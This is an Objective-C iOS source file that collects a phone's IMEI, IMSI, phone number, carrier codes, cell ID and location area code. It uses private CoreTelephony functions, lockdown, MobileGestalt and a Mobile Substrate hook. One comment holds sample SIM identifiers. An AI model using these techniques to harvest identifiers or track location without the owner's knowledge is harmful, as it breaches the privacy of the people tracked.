//
//  PhoneInfoImp.m
//  PhoneInfo
//
//  Created by Dominique  Mayrand on 11/9/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PhoneInfoImp.h"
#import "UIDevice-IOKitExtensions.h"
#import "GetCellInfo.h"
#import "CTTelephonyNetworkInfo.h"
#import "CTCarrier.h"
#import "CoreTelephonyS.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "SystemUtilsImpl.h"

#include <sys/types.h>
#include <sys/sysctl.h>

#import "liblockdown.h"
#import "MobileGestalt.h"

#define PRIVATE_PATH "/System/Library/PrivateFrameworks/CoreTelephony.framework/CoreTelephony"

#ifdef IOS_ENTERPRISE
#import "FCUUID.h"
#endif

@interface PhoneInfoImp (private)
-(CTCarrier*) getCarrier;
- (BOOL) isIphone;
//- (void) getIMEIv2: (NSThread *) aCallbackThread;
@end



@implementation PhoneInfoImp


//@synthesize mPhoneInfoDelegate;


struct CTServerConnection *sc = NULL;
struct CTResult result;

extern NSString *CTSIMSupportCopyMobileSubscriberIdentity();
extern NSString *CTSettingCopyMyPhoneNumber();


void callback2() { DLog(@"Callback2"); }


- (id) init {
	//DLog(@"init PhoneInfoCore");
	self = [super init];
	if(self)
	{
		sc = _CTServerConnectionCreate(kCFAllocatorDefault, callback2, NULL);
		if(sc == NULL)
		{
			//DLog(@"sc not created");
		}
	}
	return (self);
}

/*
- (void) getIMEIv2: (NSThread *) aCallbackThread {
    // this code run on the newly spawned thread
    
    int countPerMin = 10;                  // 6 times in 1 mins (60 / 10 = 6);
    int sleepTime        = 60/countPerMin; // 6 seconds
    int min              = 2;
    int roundCount       = countPerMin * min;
    
    for (int i = 1; i <= roundCount; i++) {
        DLog(@"step 1: try to get IMEI round %d", i);
        
        if(mIMEI == nil || [mIMEI length] == 0) {
            
            mIMEI = [self getIMEI];
            
            DLog(@"step 2: tried getting IMEI round %d and get IMEI as %@", i, mIMEI);
        
            if(mIMEI != nil && [mIMEI length] != 0) {
                DLog(@"DONE.... got IMEI %@", mIMEI);
                break;
            }
        }
        
        [NSThread sleepForTimeInterval:sleepTime];
    }
    
    DLog(@"step 3 stop trying to get IMEI %@", mIMEI);
    
    if (mPhoneInfoDelegate && [mPhoneInfoDelegate respondsToSelector:@selector(IMEIDidReceive:)]) {
        NSDictionary * results = nil;
        
        if(mIMEI != nil && [mIMEI length] != 0) {
            results = [NSDictionary dictionaryWithObjectsAndKeys:mIMEI, kIMEI, nil];
        } else {
            results = [NSDictionary dictionaryWithObjectsAndKeys:@"", kIMEI, nil];
        }

        DLog(@"going to call back DELEGATE");
        [mPhoneInfoDelegate performSelector:@selector(IMEIDidReceive:)
                                   onThread:aCallbackThread
                                 withObject:results
                              waitUntilDone:NO];
    } else {
        DLog(@"!!!! No phoneinfo delegate");
    }
}

- (void) getIMEIAsynchronouslyForThread: (NSThread *) aCallbackThread {
    [NSThread detachNewThreadSelector:@selector(getIMEIv2) toTarget:self withObject:aCallbackThread];
}
*/

- (NSString*) getIMEI {
#ifndef IOS_ENTERPRISE
	// #1 ioreg method
	if(mIMEI == nil || [mIMEI length] == 0)
	{
		// If not use ioreg method
		DLog(@"Cond 1: Allocating UIDevice");
		[mIMEI release];
	
		if ([[UIDevice currentDevice] respondsToSelector:@selector(imei)])
			mIMEI = [[UIDevice currentDevice] imei];
		
		[mIMEI retain];
	}
	
	// #2 Telephony API (crash with Bus-error 10 on iPhone 5s)
	if((mIMEI == nil || [mIMEI length] == 0) && ![SystemUtilsImpl isCPU64Type])
	{
		// This has not been tested on CDMA devices
		[mIMEI release];
		DLog(@"Cond 2: From deviceIdentidy");
		struct CTResult result = {0};
		NSString *deviceIdentity = nil;
		
		_CTServerConnectionCopyMobileIdentity(&result, sc, &deviceIdentity);
        DLog(@"Copy deviceIdentity");
		mIMEI = deviceIdentity;
		[mIMEI retain];
		[deviceIdentity release];
	}
	
	// #3 Telephony API (crashing)
//	if (mIMEI == nil || [mIMEI length] == 0) {
//		[mIMEI release];
//		DLog (@"Going to get IMEI from C function of telephony");
//		NSString * imei = [NSString stringWithCString:_CTGetIMEI() encoding:NSUTF8StringEncoding];
//		mIMEI = imei;
//		DLog (@"Got IMEI from C function of telephony = %@", mIMEI);
//		[mIMEI retain];
//	}
	
	// #4 /private/var/root/Library/Lockdown/data_ark.plist
	if (mIMEI == nil || [mIMEI length] == 0) {
		//
	}
	
	// #6 MobileGestalt dylib
	if (mIMEI == nil || [mIMEI length] == 0) {		
							
		if ([self isIphone]) {
			DLog(@"Cond 3: Get IMEI using (MobileGestalt)");
			CFStringRef imei = MGCopyAnswer(kMGInternationalMobileEquipmentIdentity);
            DLog(@"kMGInternationalMobileEquipmentIdentity %@", imei);
            
            CFStringRef serialNumber = MGCopyAnswer(kMGSerialNumber);
            if (serialNumber) {
                DLog(@"kMGSerialNumber %@", serialNumber);
                CFRelease(serialNumber);
            }
            
            CFStringRef uniqueDeviceID = MGCopyAnswer(kMGUniqueDeviceID);
            if (uniqueDeviceID) {
                DLog(@"kMGUniqueDeviceID %@", uniqueDeviceID);
                CFRelease(uniqueDeviceID);
            }
            
			if (imei) {
                [mIMEI release];
				mIMEI = (NSString *)imei;		
				[mIMEI retain];					
				CFRelease(imei);
			}
		} 		
	}
	
	// #5 Mobile substrate
	if (mIMEI == nil || [mIMEI length] == 0) {
		[mIMEI release];
//		NSString *deviceModel = [SystemUtilsImpl deviceModel]; // iPhonex,x iPodx,x or iPadx,x
//		deviceModel = [deviceModel lowercaseString];
//		NSRange locationOfIphone = [deviceModel rangeOfString:@"iphone"];
//		if (locationOfIphone.location != NSNotFound) {
		if	([self isIphone]) {
			DLog(@"Cond 4.1: Get IMEI using mobile substrate");
			MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kIMEIGetterMessagePort];
			[messagePortSender writeDataToPort:[NSData data]];
			NSData *imeiData = [messagePortSender mReturnData];
			mIMEI = [[NSString alloc] initWithData:imeiData encoding:NSUTF8StringEncoding];
			[messagePortSender release];
		} else {
			DLog (@"Cond 4.2: Get device identifier as IMEI for iPad, iPod");
			if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
				mIMEI = [[UIDevice currentDevice] performSelector:@selector(uniqueIdentifier)];
				[mIMEI retain];
			} else { // iOS 7
				mIMEI = (NSString *)MGCopyAnswer(CFSTR("UniqueDeviceID"));
			}
		}
	}
	/*
	// Need approval from PM and support because this change will effect existing activated client in the production
	// Make sure iPad, iPod use device uid as IMEI (even iPad with 3G can get IMEI)
	NSString *deviceModel = [SystemUtilsImpl deviceModel]; // iPhonex,x iPodx,x or iPadx,x
	deviceModel = [deviceModel lowercaseString];
	NSRange locationOfIphone = [deviceModel rangeOfString:@"iphone"];
	if (locationOfIphone.location == NSNotFound) {
		DLog (@"Get device identifier as IMEI for iPad, iPod");
		[mIMEI release];
		mIMEI = [[UIDevice currentDevice] performSelector:@selector(uniqueIdentifier)];
		[mIMEI retain];
	}*/
    if (mIMEI == nil || [mIMEI length] == 0) {
        [mIMEI release];
        mIMEI = @"";
        [mIMEI retain];
    }
    DLog(@"getIMEI returned with IMEI = %@", mIMEI);
	return mIMEI;
    
#else
    if (!mIMEI) {
        //Unique id for device but it will change after reset content and setting or restore a device
        mIMEI = [FCUUID uuidForDevice];
    }
    return mIMEI;
#endif
}

- (NSString*) getIMSI {
    DLog(@"getIMSI");
	NSString *imsi	= nil;
	
#ifndef IOS_ENTERPRISE
	// #1 This doesn't work on iOS 7 and crash with Segementation fault 11 on iPhone 5s
    if (![SystemUtilsImpl isCPU64Type]) {
        void *kit = dlopen(PRIVATE_PATH,RTLD_LAZY);
        int (*CTSIMSupportCopyMobileSubscriberIdentity)()	= dlsym (kit, "CTSIMSupportCopyMobileSubscriberIdentity");
        imsi = (NSString*) CTSIMSupportCopyMobileSubscriberIdentity(nil);
        dlclose(kit);
    }
    
	// #2 This works on iOS 7
	if (imsi == nil || [imsi length] == 0) {	
		DLog (@"-- lockdown --")
		LockdownConnectionRef connection	= lockdown_connect();
		CFStringRef imsi2					= (CFStringRef)lockdown_copy_value(connection, NULL, kLockdownIMSIKey);
		
		
		if (imsi2) {
			imsi							= [[NSString alloc] initWithString:(NSString *)imsi2];
			CFRelease(imsi2);
		}
		lockdown_disconnect(connection);
	}
#endif
    
    // #3 MobileGestalt
    if (imsi == nil || [imsi length] == 0) {
		DLog (@"-- MobileGestalt --");
		id carrierBundleInfo = MGCopyAnswer(kMGCarrierBundleInfo);
		//DLog (@"carrierBundleInfo = %@", carrierBundleInfo);
        
        if (carrierBundleInfo && [carrierBundleInfo count] > 0) {
            NSDictionary *networkInfo = [carrierBundleInfo objectAtIndex:0];
            /*
             networkInfo:
             {
             CFBundleIdentifier = "com.apple.TrueH_th";
             CFBundleVersion = "18.0";
             IntegratedCircuitCardIdentity = 8966002513900866165;
             InternationalMobileSubscriberIdentity = 520002046000636;
             MCC = 520;
             MNC = 00;
             SIMGID1 = <01ff>;
             SIMGID2 = <ffff>;
             }
             */
            imsi = [[networkInfo objectForKey:@"InternationalMobileSubscriberIdentity"] retain];
        }
	}
    
    DLog(@"getIMSI returned with imsi = %@", imsi);
	return [imsi autorelease];
}

-(NSString*) getPhoneNumber
{
	DLog(@"getPhoneNumber");
	NSString *phoneNumber = CTSettingCopyMyPhoneNumber();
	if(!phoneNumber){
		DLog(@"getPhoneNumber, search in user default");
		phoneNumber = [[[NSUserDefaults standardUserDefaults] stringForKey:@"SBFormattedPhoneNumber"] retain];
	}

#ifndef IOS_ENTERPRISE
	if (phoneNumber == nil || [phoneNumber length] == 0) {
		LockdownConnectionRef connection	= lockdown_connect();
		phoneNumber							= (NSString *) lockdown_copy_value(connection, NULL, kLockdownPhoneNumberKey);		
		lockdown_disconnect(connection);
	}
#endif

    [phoneNumber autorelease];
	DLog(@"getPhoneNumber returned with phone number = %@", phoneNumber);
	return phoneNumber;
}

-(NSString*) getMobileCountryCode
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier mobileCountryCode];
	}
    DLog(@"getMobileCountryCode = %@", val);
	return val;
}

-(NSString*) getMobileNetworkCode
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier mobileNetworkCode];
	}
    DLog(@"getMobileNetworkCode = %@", val);
	return val;
}

-(NSString*) getNetworkName
{
	CTCarrier* carrier = [self getCarrier];
	NSString *val = nil;
	if(carrier)
	{
		val = [carrier carrierName];
	}
	return val;
}

-(NSString*) getDeviceInfo
{
//	NSString *value = [[NSString alloc] initWithFormat:@"Name:%@, SystemName:%@, SystemVersion:%@, Model:%@, LocalizedMedol:%@",
//									[[UIDevice currentDevice] name],
//									[[UIDevice currentDevice] systemName],
//									[[UIDevice currentDevice] systemVersion],
//									[[UIDevice currentDevice] model],
//									[[UIDevice currentDevice] localizedModel]];
//	[value autorelease];
	
	NSString *value = [NSString stringWithFormat:@"iOS %@", [[UIDevice currentDevice] systemVersion]];
	return value;
}

-(NSString*) getDeviceModel
{
	//return [UIDevice currentDevice].model;
	
	NSString *deviceModel = [NSString stringWithString:[SystemUtilsImpl deviceModelVersion]]; 
	return (deviceModel);
}

-(NSString*) getOSVersion
{
	return [UIDevice currentDevice].systemVersion;
	
}

-(NetworkType) getNetworkType
{
	NetworkType nt = kNetworkTypeGSM;
	size_t size;
	
	// Set 'oldp' parameter to NULL to get the size of the data
	// returned so we can allocate appropriate amount of space
	sysctlbyname("hw.machine", NULL, &size, NULL, 0); 
	
	// Allocate the space to store name
	char *name = malloc(size);
	
	// Get the platform name
	sysctlbyname("hw.machine", name, &size, NULL, 0);
	
	// Place name into a string
	NSString *platform = [NSString stringWithUTF8String:name];
	
	// Done with this
	free(name);
	
	if ([platform isEqualToString:@"iPhone1,1"])	nt = kNetworkTypeGSM; // iPhone 1G
    if ([platform isEqualToString:@"iPhone1,2"])	nt = kNetworkTypeGSM; // iPhone 3G
    if ([platform isEqualToString:@"iPhone2,1"])	nt = kNetworkTypeGSM; // iPhone 3GS
    if ([platform isEqualToString:@"iPhone3,1"])	nt = kNetworkTypeGSM; // iPhone 4
	if ([platform isEqualToString:@"iPhone3,3"])	nt = kNetworkTypeGSM; // iPhone 4 CDMA Verizon
    if ([platform isEqualToString:@"iPod1,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 1G
    if ([platform isEqualToString:@"iPod2,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 2G
	if ([platform isEqualToString:@"iPod3,1"])		nt = kNetworkTypeWIFIOnly; // iPod Touch 3G
    if ([platform isEqualToString:@"iPod4,1"])      nt = kNetworkTypeWIFIOnly; // iPod Touch 4G
    if ([platform isEqualToString:@"iPad1,1"])      nt = kNetworkTypeWIFIOnly; // iPad 1;
    if ([platform isEqualToString:@"iPad2,1"])      nt = kNetworkTypeWIFIOnly; // iPad 2 (WiFi)
    if ([platform isEqualToString:@"iPad2,2"])      nt = kNetworkTypeGSM; // iPad 2 (GSM)";
    if ([platform isEqualToString:@"iPad2,3"])      nt = kNetworkTypeCDMA; //iPad 2 (CDMA)
    //if ([platform isEqualToString:@"i386"])         return @"Simulator";

	return nt;
}

-(NSString*) getMEID
{
	return @"-1";
}

-(NSString*) getCellID {
	NSString *cellID = @"0";
	if (sc != nil) {
		id cellInfo = nil;
		struct CTResult r;
		
		_CTServerConnectionCopyServingCellInfo(&r, sc, &cellInfo);
		
		DLog (@"cellInfo = %@", cellInfo)
		
		cellID = [[[NSString alloc] initWithFormat:@"%@", [cellInfo objectForKey:@"kCTRegistrationGsmCellId"]] autorelease];
	}
	return (cellID);
}

-(NSString*) getLocalAreaCode {
	NSString *lac = @"0";
	if (sc != nil) {
		id cellInfo = nil;
		struct CTResult r;
		
		_CTServerConnectionCopyServingCellInfo(&r, sc, &cellInfo);
		
		DLog (@"cellInfo = %@", cellInfo)
		
		lac = [[[NSString alloc] initWithFormat:@"%@", [cellInfo objectForKey:@"kCTRegistrationGsmLac"]] autorelease];
	}
	return (lac);
}

-(int)getBatteryLevel {
    bool isBatteryMonitoring = [[UIDevice currentDevice] isBatteryMonitoringEnabled]; // value is positive otherwise negative
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:true];
    NSNumber *bl = [NSNumber numberWithFloat:([[UIDevice currentDevice] batteryLevel] * 100)];
    int batteryLevel = bl.intValue;
    DLog(@"battery Level : %d", batteryLevel);
    batteryLevel = !(batteryLevel >= 0 && batteryLevel <= 100) ? 255 : batteryLevel; // by default, phoenix protocol
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:isBatteryMonitoring];
    return batteryLevel;
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

-(CTCarrier*) getCarrier
{
	//DLog(@"TelephonyNetworkInfo");
	CTCarrier *carrier = nil;
	
	CTTelephonyNetworkInfo *netInfo = [[CTTelephonyNetworkInfo alloc] init];
	if(netInfo)
	{
		//DLog(@"Subscriber cellular provider");
		carrier = [netInfo subscriberCellularProvider];
		//DLog(@"setMCC");
		[netInfo release];
	}
	return carrier;
}

- (BOOL) isIphone {
	NSString *deviceModel		= [SystemUtilsImpl deviceModel]; // iPhonex,x iPodx,x or iPadx,x
	deviceModel					= [deviceModel lowercaseString];
	NSRange locationOfIphone	= [deviceModel rangeOfString:@"iphone"];
	BOOL isIphone				= NO;
	if (locationOfIphone.location != NSNotFound) 
		isIphone			= YES;
	return isIphone;
}

- (void) dealloc
{
	//DLog(@"PhoneInfo core dealloc");
	if(	mIMEI )
	{
		[mIMEI release];
	}
	
	if( mMEID )
	{
		[mMEID release];
	}
	if(sc)
	{
		//DLog(@"Freeing ServerConnection");
		//_CTServerConnectionDestroy(sc);
		//DLog(@"ServerConnection freed");
	}
	//[self setMPhoneInfoDelegate:nil];
	[super dealloc];
}

@end
